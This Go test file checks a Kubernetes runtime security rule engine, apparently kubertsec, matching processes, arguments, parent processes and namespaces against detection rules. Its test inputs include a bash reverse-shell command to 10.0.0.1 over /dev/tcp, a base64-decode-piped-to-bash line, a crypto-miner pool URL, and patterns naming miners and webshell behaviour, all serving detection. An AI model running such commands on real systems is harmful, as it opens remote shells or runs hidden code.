// pkg/rules/engine_test.go
package rules_test

import (
	"testing"

	"github.com/Debasish-87/kubertsec/pkg/rules"
)

func TestMatchExactProcess(t *testing.T) {
	rs := &rules.RuleSet{Rules: []rules.Rule{
		{Name: "test_curl", Process: "curl", Severity: "high", Message: "curl"},
	}}
	e, _ := rules.NewEngine(rs)

	rule := e.Match(rules.MatchContext{Process: "curl"})
	if rule == nil {
		t.Fatal("expected match for exact process 'curl'")
	}
	if rule.Name != "test_curl" {
		t.Errorf("expected rule 'test_curl', got %q", rule.Name)
	}
}

func TestMatchProcessList(t *testing.T) {
	rs := &rules.RuleSet{Rules: []rules.Rule{
		{Name: "shells", Processes: []string{"bash", "sh", "zsh"}, Severity: "high", Message: "shell"},
	}}
	e, _ := rules.NewEngine(rs)

	for _, p := range []string{"bash", "sh", "zsh"} {
		if rule := e.Match(rules.MatchContext{Process: p}); rule == nil {
			t.Errorf("expected match for process %q", p)
		}
	}
	if rule := e.Match(rules.MatchContext{Process: "fish"}); rule != nil {
		t.Errorf("unexpected match for 'fish'")
	}
}

func TestMatchProcessRegex(t *testing.T) {
	rs := &rules.RuleSet{Rules: []rules.Rule{
		{Name: "miners", ProcessRegex: `^(xmrig|minerd|kdevtmpfsi)$`, Severity: "critical", Message: "miner"},
	}}
	e, _ := rules.NewEngine(rs)

	for _, p := range []string{"xmrig", "minerd", "kdevtmpfsi"} {
		if rule := e.Match(rules.MatchContext{Process: p}); rule == nil {
			t.Errorf("expected regex match for %q", p)
		}
	}
	if rule := e.Match(rules.MatchContext{Process: "nginx"}); rule != nil {
		t.Errorf("unexpected match for 'nginx'")
	}
}

func TestMatchArgsContains(t *testing.T) {
	rs := &rules.RuleSet{Rules: []rules.Rule{
		{Name: "tmp_exec", Args: "/tmp/", Severity: "high", Message: "tmp"},
	}}
	e, _ := rules.NewEngine(rs)

	rule := e.Match(rules.MatchContext{Process: "bash", Args: "bash /tmp/malware.sh"})
	if rule == nil {
		t.Fatal("expected match for args containing /tmp/")
	}

	rule = e.Match(rules.MatchContext{Process: "bash", Args: "bash /home/user/script.sh"})
	if rule != nil {
		t.Fatal("unexpected match — args do not contain /tmp/")
	}
}

func TestMatchArgsAny(t *testing.T) {
	rs := &rules.RuleSet{Rules: []rules.Rule{
		{
			Name:     "rev_shell",
			Process:  "bash",
			ArgsAny:  []string{"/dev/tcp", "0>&1", "bash -i"},
			Severity: "critical",
			Message:  "reverse shell",
		},
	}}
	e, _ := rules.NewEngine(rs)

	tests := []struct {
		args  string
		match bool
	}{
		{"bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'", true},
		{"bash /tmp/shell.sh", false},
		{"bash -i", true},
	}
	for _, tt := range tests {
		rule := e.Match(rules.MatchContext{Process: "bash", Args: tt.args})
		if (rule != nil) != tt.match {
			t.Errorf("args=%q: expected match=%v, got rule=%v", tt.args, tt.match, rule)
		}
	}
}

func TestMatchArgsList(t *testing.T) {
	rs := &rules.RuleSet{Rules: []rules.Rule{
		{
			Name:     "stratum",
			ArgsList: []string{"stratum+tcp", "pool"},
			Severity: "critical",
			Message:  "mining",
		},
	}}
	e, _ := rules.NewEngine(rs)

	// Both substrings present → match
	rule := e.Match(rules.MatchContext{Process: "xmrig", Args: "stratum+tcp://pool.minexmr.com:443"})
	if rule == nil {
		t.Error("expected match when ALL args_list items present")
	}

	// Only one substring → no match
	rule = e.Match(rules.MatchContext{Process: "xmrig", Args: "stratum+tcp://someother.host"})
	if rule != nil {
		t.Error("unexpected match when only partial args_list matches")
	}
}

func TestMatchArgsRegex(t *testing.T) {
	rs := &rules.RuleSet{Rules: []rules.Rule{
		{
			Name:      "base64_pipe",
			ArgsRegex: `base64\s+-d`,
			Severity:  "high",
			Message:   "base64 decode",
		},
	}}
	e, _ := rules.NewEngine(rs)

	rule := e.Match(rules.MatchContext{Process: "bash", Args: "echo cm9vdA== | base64 -d | bash"})
	if rule == nil {
		t.Error("expected regex match for base64 -d pattern")
	}
}

func TestMatchParentProcess(t *testing.T) {
	rs := &rules.RuleSet{Rules: []rules.Rule{
		{
			Name:          "webshell",
			Processes:     []string{"bash", "sh"},
			ParentProcess: "nginx",
			Severity:      "critical",
			Message:       "webshell indicator",
		},
	}}
	e, _ := rules.NewEngine(rs)

	// Shell spawned by nginx → match
	rule := e.Match(rules.MatchContext{Process: "bash", ParentProcess: "nginx"})
	if rule == nil {
		t.Error("expected match when parent is nginx")
	}

	// Shell spawned by sshd → no match
	rule = e.Match(rules.MatchContext{Process: "bash", ParentProcess: "sshd"})
	if rule != nil {
		t.Errorf("unexpected match when parent is sshd (not nginx)")
	}
}

func TestMatchNamespaceWhitelist(t *testing.T) {
	rs := &rules.RuleSet{Rules: []rules.Rule{
		{
			Name:       "prod_curl",
			Process:    "curl",
			Namespaces: []string{"production", "staging"},
			Severity:   "high",
			Message:    "curl in prod",
		},
	}}
	e, _ := rules.NewEngine(rs)

	// In production → match
	rule := e.Match(rules.MatchContext{Process: "curl", Namespace: "production"})
	if rule == nil {
		t.Error("expected match in production namespace")
	}

	// In development → no match
	rule = e.Match(rules.MatchContext{Process: "curl", Namespace: "development"})
	if rule != nil {
		t.Error("unexpected match in development namespace (not in whitelist)")
	}
}

func TestMatchNamespaceBlacklist(t *testing.T) {
	rs := &rules.RuleSet{Rules: []rules.Rule{
		{
			Name:              "curl_any_ns",
			Process:           "curl",
			ExcludeNamespaces: []string{"monitoring", "logging"},
			Severity:          "medium",
			Message:           "curl outside trusted namespaces",
		},
	}}
	e, _ := rules.NewEngine(rs)

	// In monitoring → no match (excluded)
	rule := e.Match(rules.MatchContext{Process: "curl", Namespace: "monitoring"})
	if rule != nil {
		t.Error("unexpected match in excluded namespace 'monitoring'")
	}

	// In default → match
	rule = e.Match(rules.MatchContext{Process: "curl", Namespace: "default"})
	if rule == nil {
		t.Error("expected match in non-excluded namespace 'default'")
	}
}

func TestDisabledRule(t *testing.T) {
	disabled := false
	rs := &rules.RuleSet{Rules: []rules.Rule{
		{Name: "disabled_rule", Process: "curl", Enabled: &disabled, Severity: "high", Message: "disabled"},
	}}
	e, _ := rules.NewEngine(rs)

	if rule := e.Match(rules.MatchContext{Process: "curl"}); rule != nil {
		t.Error("expected no match for disabled rule")
	}
}

func TestNoMatchEmpty(t *testing.T) {
	e, _ := rules.NewEngine(&rules.RuleSet{})
	if rule := e.Match(rules.MatchContext{Process: "bash"}); rule != nil {
		t.Error("expected no match with empty rule set")
	}
}

func TestNormalizeProcess(t *testing.T) {
	rs := &rules.RuleSet{Rules: []rules.Rule{
		{Name: "mount", Process: "mount", Severity: "critical", Message: "mount"},
	}}
	e, _ := rules.NewEngine(rs)

	// With path prefix
	rule := e.Match(rules.MatchContext{Process: "/usr/bin/mount"})
	if rule == nil {
		t.Error("expected match for /usr/bin/mount after normalization")
	}

	// With kernel brackets
	rule = e.Match(rules.MatchContext{Process: "[mount]"})
	if rule == nil {
		t.Error("expected match for [mount] after normalization")
	}
}
